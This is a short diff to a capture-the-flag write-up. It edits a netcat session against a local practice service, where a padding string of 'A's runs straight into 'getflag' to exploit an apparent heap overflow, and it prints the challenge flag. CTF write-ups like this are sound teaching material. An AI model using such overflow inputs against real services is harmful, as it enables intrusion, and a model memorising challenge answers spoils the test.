@@ -43,7 +43,7 @@ if(strncmp(line, "login ", 6) == 0) {
 }
 ```
 
-```bash
+```
 ➜ nc 127.0.0.1 18000
 ___________        .__    __                              __   .__                                        
 \_   _____/_____   |  |  |  | _________   ____  _____   _/  |_ |  |__                                     
@@ -60,8 +60,7 @@ User:
 >prompt AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 User: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-getflag
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgetflag
 Flag: GCTF{WH47_4_he4pPie_EXPL0I7}
 ```
 
